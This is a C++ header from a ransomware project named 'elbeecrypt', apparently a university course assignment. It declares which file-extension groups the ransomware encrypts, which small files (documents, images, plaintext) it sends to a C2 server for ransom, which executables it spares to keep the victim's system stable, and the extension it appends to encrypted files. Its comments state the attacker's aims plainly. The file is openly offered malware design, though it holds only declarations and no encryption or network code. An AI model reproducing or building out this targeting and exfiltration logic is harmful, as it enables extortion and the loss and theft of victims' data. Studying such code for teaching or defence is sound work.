#pragma once

#include <filesystem>
#include <string>
#include <vector>
#include "elbeecrypt/common/utils/container.hpp"
#include "elbeecrypt/common/targets/category.hpp"

//Extension group imports
#include "elbeecrypt/common/targets/extgroup/archive.hpp"
#include "elbeecrypt/common/targets/extgroup/audio.hpp"
#include "elbeecrypt/common/targets/extgroup/document.hpp"
#include "elbeecrypt/common/targets/extgroup/executable.hpp"
#include "elbeecrypt/common/targets/extgroup/image.hpp"
#include "elbeecrypt/common/targets/extgroup/misc.hpp"
#include "elbeecrypt/common/targets/extgroup/plain.hpp"
#include "elbeecrypt/common/targets/extgroup/video.hpp"

namespace fs = std::filesystem;

/**
 * @brief Contains groups of extensions based on a "tag" system
 * The tag system dictates how the ransomware should treat members
 * in the group. For example, extensions in the `encryptable`
 * group should be encrypted regardless of the mode the ransomware
 * is running in. This file also defines the extension that is to
 * be given to files that were hit.
 * 
 * @author CECS-378 Group 10
 * @file extensions.hpp
 */
namespace elbeecrypt::common::targets::Extensions {
	//Constants
	/**
	 * @brief The extension that is to be appended to an encrypted 
	 * file. This also controls which files the decryptor portion
	 * will attempt to decrypt by default.
	 */
	const std::string encryptedExtension = "elbeecrypt";


	//Extension group definitions
	/**
	 * @brief A list of the extensions that should be targeted by
	 * the encryption routine. These extensions are defined in
	 * separate files according to their category in the sub-
	 * directory `extgroup`.
	 */
	const std::vector<std::string> encryptable = utils::Container::concatVectors({
		extgroup::Archive::values,
		extgroup::Audio::values,
		extgroup::Document::values,
		extgroup::Image::values,
		extgroup::Misc::values,
		extgroup::Plain::values,
		extgroup::Video::values
	});

	/**
	 * @brief A list of extensions that map to file types that
	 * are normally small in size, eg: documents. This allows
	 * data exfiltration to be quicker, as it relies on smaller 
	 * files that are to be sent to a C2 server for ransom. If
	 * the ransomware is set to exfiltrate data, this list will
	 * be consulted. Otherwise, it is to be treated the same as
	 * any other encryptable file.
	 */
	const std::vector<std::string> exfiltratable = utils::Container::concatVectors({
		extgroup::Document::values, //Documents are generally small in size and could contain juicy info that can be leveraged against the target
		extgroup::Image::values, //Images are generally small in size
		extgroup::Plain::values //Plaintext files are generally small in size
	});

	/**
	 * @brief A list of the extensions that should be ignored by
	 * the ransomware. Like the `encryptable` extensions, these 
	 * are defined in `extgroup`. Unlike the encryptables, 
	 * extensions in this group should not be targeted at all
	 * regardless of the mode of the ransomware. Doing so could
	 * cause instability with the system which is not the goal.
	 */
	const std::vector<std::string> passable = extgroup::Executable::values;


	//Helper methods
	/**
	 * @brief Gets the member category of a given extension. If 
	 * the extension is not registered, then Category::UNDEFINED
	 * is returned instead.
	 * 
	 * @param extension The extension to get the category for
	 * @return The category to which the extension belongs
	 */
	const Category getCategory(const std::string& extension);

	/**
	 * @brief Indicates whether a given category is encryptable
	 * by the ransomware.
	 * 
	 * @param extension The category to check
	 * @return Whether the category is allowed to be encrypted
	 */
	bool isEncryptable(const Category& category);

	/**
	 * @brief Indicates whether a given extension is encryptable
	 * by the ransomware, ie: the extension is in the list of 
	 * targetable extensions.
	 * 
	 * @param extension The extension to check
	 * @return Whether the extension is allowed to be encrypted
	 */
	bool isEncryptable(const std::string& extension);

	/**
	 * @brief Indicates whether a given category is able to be
	 * exfiltrated to the attacker by the ransomware
	 * 
	 * @param extension The category to check
	 * @return Whether the category is allowed to be exfiltrated
	 */
	bool isExfiltratable(const Category& category);

	/**
	 * @brief Indicates whether a given extension is able to be
	 * exfiltrated to the attacker by the ransomware, ie: the 
	 * extension is in a list of exfiltratable extensions. The
	 * extension, in addition, is also encryptable, so this check
	 * may be subsituted in place.
	 * 
	 * @param extension The extension to check
	 * @return Whether the extension is allowed to be exfiltrated
	 */
	bool isExfiltratable(const std::string& extension);

	/**
	 * @brief Isolates a file extension from a path.
	 * 
	 * @param path The input path
	 * @return The isolated extension, excluding the period
	 */
	std::string isolateExtension(const fs::path& path);

	/**
	 * @brief Isolates a file extension from a path string
	 * 
	 * @param path The input path string
	 * @return The isolated extension, excluding the period
	 */
	std::string isolateExtension(const std::string& path);
	
	/**
	 * @brief Indicates whether a given category should be 
	 * spared by the ransomware.
	 * 
	 * @param extension The category to check
	 * @return Whether the ransomware should ignore the category
	 */
	bool isPassable(const Category& category);

	/**
	 * @brief Indicates if the extension should be spared by
	 * the ransomware either because its in the list of extensions
	 * to pass or the extension isn't recognized.
	 * 
	 * @param extension The extension to check
	 * @return Whether the ransomware should ignore the extension
	 */
	bool isPassable(const std::string& extension);
}